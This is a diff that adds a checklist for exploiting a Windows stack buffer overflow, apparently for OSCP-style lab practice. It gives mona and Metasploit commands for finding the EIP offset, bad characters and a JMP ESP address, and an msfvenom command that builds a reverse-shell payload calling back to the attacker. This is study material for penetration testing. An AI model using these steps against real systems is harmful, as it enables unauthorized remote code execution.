@@ -1,0 +1,16 @@
+- [ ] Configure mona: `!mona config -set workingfolder c:\mona\%p`
+- [ ] Crash the app with fuzzer
+- [ ] Use pattern create to exploit `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <crashpoint+400>`
+- [ ] Execute exploit and find distance: `!mona findmsp -distance <crashpoint+400>` (look for EIP contains normal pattern : ... (offset XXXX))
+- [ ] Update exploit with offset variable and set retn to "BBBB"
+- [ ] Run exploit again, check if EIP is 42424242
+*Repeat until all bad characters are found*
+	- [ ] Generate bytearray with mona: `!mona bytearray -b "\x00"`
+	- [ ] Generate bytearray with python
+	- [ ] Include python's bytearray in exploit.py and compare results: `!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address>`
+	- [ ] Take note of bad characters and generate new bytearray in mona and python
+- [ ] Find jump points `!mona jmp -r esp -cpb "<hex-bad-chars>"`
+- [ ] Update retn from exploit.py with one of the jump points written backwards (e.g. "\x01\x02\x03\x04" in Immunity is "\x04\x03\x02\x01" in exploit)
+- [ ] Generate payload: `msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 EXITFUNC=thread -b "<badchars>" -f c`
+- [ ] Prepend NOPs: `padding = "\x90" * 16`
+- [ ] Exploit
